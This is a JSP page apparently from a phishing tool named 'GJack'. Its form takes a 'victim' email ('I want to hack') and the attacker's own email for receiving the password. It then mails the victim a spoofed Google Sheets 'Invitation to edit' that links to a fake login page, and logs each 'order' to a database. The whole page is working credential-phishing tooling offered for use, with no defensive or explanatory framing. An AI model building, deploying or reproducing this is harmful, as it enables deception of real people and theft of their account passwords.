<%@ page import="com.theah64.gjack.core.EmailTemplates" %>
<%@ page import="com.theah64.gjack.database.Orders" %>
<%@ page import="com.theah64.gjack.model.Order" %>
<%@ page import="com.theah64.gjack.utils.SecretConstants" %>
<%@ page import="com.theah64.webengine.exceptions.MailException" %>
<%@ page import="com.theah64.webengine.utils.Form" %>
<%@ page import="com.theah64.webengine.utils.MailHelper" %>
<%@ page import="com.theah64.webengine.utils.RandomString" %>
<%@ page import="java.sql.SQLException" %>
<html>
<head>
    <%
        final String key = RandomString.get(10);
    %>
    <title>GJack</title>
    <%@include file="common_headers.jsp" %>

    <script>
        $(document).ready(function () {

            //Setting default values
            $("a#a_shared_by").html('<%=Orders.DEFAULT_SHARED_BY%>');
            $("a#a_doc_title").html('<%=Orders.DEFAULT_DOC_TITLE%>');
            $("a.order_link").attr('href', '/login.jsp?order_key=<%=key%>');


            $(".input_listener").on('keyup', function () {
                $($(this).data("target")).text($(this).val());
            });

            $("input#enable_sender_gmail").change(function () {
                $("input.gmail_credentials").prop('disabled', !this.checked);
            });


        });

    </script>
</head>
<body>
<div class="container">

    <div class="row">
        <div class="col-md-12">
            <h2>GJack</h2>
        </div>
    </div>

    <%
        try {
            final Form form = new Form(request, new String[]{
                    Orders.COLUMN_VICTIM_EMAIL,
                    Orders.COLUMN_USER_EMAIL
            });

            if (form.isSubmitted()) {

                /**
                 * id,
                 _key,
                 victim_email,
                 user_email,
                 shared_by
                 doc_title,
                 doc_url,
                 is_read,
                 content,
                 created_at
                 */


                final String victimEmail = form.getString(Orders.COLUMN_VICTIM_EMAIL);
                final String userEmail = form.getString(Orders.COLUMN_USER_EMAIL);

                final String sharedBy = form.getString(Orders.COLUMN_SHARED_BY, Orders.DEFAULT_SHARED_BY);
                final String docTitle = form.getString(Orders.COLUMN_DOC_TITLE, Orders.DEFAULT_DOC_TITLE);
                final String docUrl = form.getString(Orders.COLUMN_DOC_URL, Orders.DEFAULT_DOC_URL);

                final String gmailUsername = form.getString(Orders.KEY_SENDER_GMAIL_USERNAME, SecretConstants.GMAIL_USERNAME);
                final String gmailPassword = form.getString(Orders.KEY_SENDER_GMAIL_PASSWORD, SecretConstants.GMAIL_PASSWORD);

                final String content = EmailTemplates.getInvitation(key, sharedBy, docTitle);

                //Sending mail
                MailHelper.init(gmailUsername, gmailPassword);
                MailHelper.sendMail(victimEmail, docTitle + " - Invitation to edit", content, sharedBy + " (via Google Sheets)");

                //Adding data to db
                Orders.getInstance().add(new Order(null, key, victimEmail, userEmail, sharedBy, docTitle, docUrl, content, false));
            }

        } catch (MailException | SQLException e) {
            e.printStackTrace();

    %>
    <p class="text-danger"><%=e.getMessage()%>
    </p>
    <%
        }
    %>

    <div class="row">

        <div class="col-md-4">

            <form action="order.jsp" method="POST">


                <%--Victim email--%>
                <div class="form-group">
                    <label for="victim_email">I want to hack </label>
                    <input id="victim_email" name="victim_email" type="email"
                           placeholder="Victim's email address" class="form-control"
                           required/>
                </div>


                <%--My email--%>
                <div class="form-group">
                    <label for="user_email">and send me the password to </label>
                    <input id="user_email" name="user_email" type="email" placeholder="Your email address"
                           class="form-control"
                           required/>
                </div>

                <%--Content name--%>
                <div class="form-group">
                    <label for="shared_by">You can use this name in the mail </label>
                    <input id="shared_by" name="shared_by" type="text" placeholder="Any name"
                           value="<%=Orders.DEFAULT_SHARED_BY%>"
                           class="form-control input_listener"
                           data-target="a#a_shared_by"
                           required/>
                </div>


                <%--Document title--%>
                <div class="form-group">
                    <label for="doc_title">Document title should be</label>
                    <input id="doc_title" name="doc_title" type="text" placeholder="Document title" value="Report"
                           class="form-control input_listener"
                           data-target="a#a_doc_title"
                           required/>
                </div>

                <%--Custom doc url--%>
                <div class="form-group">
                    <label for="doc_url">Redirect to this google document</label>
                    <input id="doc_url" name="doc_url" type="text" placeholder="Valid google doc URL"
                           value="https://docs.google.com/spreadsheets/d/1shEpADXr7CTQMXEF9TE-xydAbmG3EfpRqCmMhYgBuQY/edit?usp=sharing"
                           class="form-control"
                           required/>
                </div>

                <%--Enable my gmail account--%>
                <div class="form-group">
                    <input id="enable_sender_gmail" name="enable_sender_gmail" type="checkbox"/>
                    <label for="enable_sender_gmail">Send the attack from my gmail</label>

                </div>

                <%--Gmail username--%>
                <div class="form-group">
                    <label for="sender_gmail">GMail username</label>
                    <input id="sender_gmail" type="email" name="sender_gmail" class="form-control gmail_credentials"
                           placeholder="Enter your gmail address" disabled/>
                </div>

                <%--Gmail password--%>
                <div class="form-group">
                    <label for="sender_gmail_password">GMail password</label>
                    <input id="sender_gmail_password" type="password" name="sender_gmail_password"
                           class="form-control gmail_credentials"
                           placeholder="Enter your gmail password" disabled/>
                </div>


                <div class="form-group">
                    <input class="btn btn-primary" name="is_submitted" type="submit" value="Send"/>
                </div>

            </form>
        </div>

        <div class="col-md-8">

            <div id="email_template">
                <%=EmailTemplates.INVITATION_HTML%>
            </div>

        </div>

    </div>


</div>
</body>
</html>



